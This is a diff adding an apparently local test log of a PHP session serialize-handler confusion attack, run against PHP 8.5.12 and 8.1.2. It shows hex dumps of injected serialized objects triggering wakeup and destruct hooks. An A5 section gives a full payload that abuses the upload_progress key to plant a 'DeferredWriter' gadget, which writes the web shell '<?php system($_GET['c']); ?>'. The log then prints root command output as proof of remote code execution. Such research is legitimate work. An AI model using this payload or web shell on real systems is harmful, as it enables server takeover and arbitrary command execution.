@@ -1,0 +1,73 @@
+==================================================================
+ A0: php_binary write / php read -> object RETAINED in $_SESSION
+==================================================================
+--- 8.5.12 (plain2) ---
+[w_bin] handler=php_binary wrote
+00000000  08 75 73 65 72 70 72 65  66 73 3a 36 37 3a 22 69  |.userprefs:67:"i|
+00000010  6e 6a 7c 4f 3a 37 3a 22  45 76 69 6c 4f 62 6a 22  |nj|O:7:"EvilObj"|
+00000020  3a 32 3a 7b 73 3a 33 3a  22 63 6d 64 22 3b 73 3a  |:2:{s:3:"cmd";s:|
+00000030  35 3a 22 42 49 4e 57 52  22 3b 73 3a 34 3a 22 6e  |5:"BINWR";s:4:"n|
+00000040  6f 74 65 22 3b 73 3a 35  3a 22 70 77 6e 65 64 22  |ote";s:5:"pwned"|
+00000050  3b 7d 22 3b                                       |;}";|
+WAKEUP-VAR_DUMP: object(EvilObj)#1 (2) {
+  ["cmd"]=>
+  string(5) "BINWR"
+  ["note"]=>
+  string(5) "pwned"
+}
+
+Warning: session_start(): Failed to decode session object. Session has been destroyed in /tmp/p2s_fin/r_php.php on line 10
+[r_php] decode SUCCESSFUL? $_SESSION retained:
+array(0) {
+}
+[PASS] 8.5.12 BIN_WAKE.txt: wakeup BINWR
+[PASS] 8.5.12 BIN_DEST.txt: destruct BINWR
+--- 8.1.2 (system) ---
+[w_bin] handler=php_binary wrote
+00000000  08 75 73 65 72 70 72 65  66 73 3a 36 37 3a 22 69  |.userprefs:67:"i|
+00000010  6e 6a 7c 4f 3a 37 3a 22  45 76 69 6c 4f 62 6a 22  |nj|O:7:"EvilObj"|
+00000020  3a 32 3a 7b 73 3a 33 3a  22 63 6d 64 22 3b 73 3a  |:2:{s:3:"cmd";s:|
+00000030  35 3a 22 42 49 4e 57 52  22 3b 73 3a 34 3a 22 6e  |5:"BINWR";s:4:"n|
+00000040  6f 74 65 22 3b 73 3a 35  3a 22 70 77 6e 65 64 22  |ote";s:5:"pwned"|
+00000050  3b 7d 22 3b                                       |;}";|
+WAKEUP-VAR_DUMP: object(EvilObj)#1 (2) {
+  ["cmd"]=>
+  string(5) "BINWR"
+  ["note"]=>
+  string(5) "pwned"
+}
+PHP Warning:  session_start(): Failed to decode session object. Session has been destroyed in /tmp/p2s_fin/r_php.php on line 10
+[r_php] decode SUCCESSFUL? $_SESSION retained:
+array(0) {
+}
+[PASS] 8.1 BIN_WAKE.txt: wakeup BINWR
+[PASS] 8.1 BIN_DEST.txt: destruct BINWR
+
+==================================================================
+ A5: FULL RCE on the 8.5.12 target build (cli-server, 4 workers)
+ write side: -d session.serialize_handler=php_serialize (ini-level),
+ upload_progress key injection; read side: script ini_set('php')
+==================================================================
+[A5] payload: inj|O:14:"DeferredWriter":2:{s:4:"path";s:33:"/tmp/p2s_fin/html/fin85_shell.php";s:4:"data";s:28:"<?php system($_GET['c']); ?>";}
+STATUS: HTTP/1.1 200 OK
+--- session file written by the 8.5.12 hook (php_serialize) ---
+00000000  61 3a 31 3a 7b 73 3a 31  34 35 3a 22 75 70 6c 6f  |a:1:{s:145:"uplo|
+00000010  61 64 5f 70 72 6f 67 72  65 73 73 5f 69 6e 6a 7c  |ad_progress_inj||
+00000020  4f 3a 31 34 3a 22 44 65  66 65 72 72 65 64 57 72  |O:14:"DeferredWr|
+00000030  69 74 65 72 22 3a 32 3a  7b 73 3a 34 3a 22 70 61  |iter":2:{s:4:"pa|
+00000040  74 68 22 3b 73 3a 33 33  3a 22 2f 74 6d 70 2f 70  |th";s:33:"/tmp/p|
+00000050  32 73 5f 66 69 6e 2f 68  74 6d 6c 2f 66 69 6e 38  |2s_fin/html/fin8|
+00000060  35 5f 73 68 65 6c 6c 2e  70 68 70 22 3b 73 3a 34  |5_shell.php";s:4|
+00000070  3a 22 64 61 74 61 22 3b  73 3a 32 38 3a 22 3c 3f  |:"data";s:28:"<?|
+--- read request (reader switches to php) ---
+<br />
+<b>Warning</b>:  session_start(): Failed to decode session object. Session has been destroyed in <b>/tmp/p2s_fin/html/read.php</b> on line <b>9</b><br />
+[read.php 8.5] handler=php PHP 8.5.12 cli-server
+[read.php 8.5] done
+[PASS] A5: 8.5.12 gadget fired, fin85_shell.php written: <?php system($_GET['c']); ?>
+[A5 RCE receipt on 8.5.12] -> uid=0(root) gid=0(root) groups=0(root)
+6.18.54.1-microsoft-standard-WSL2
+[PASS] A5 RCE on 8.5.12 (uid output above)
+==================================================================
+ artifacts: /tmp/p2s_fin
+==================================================================
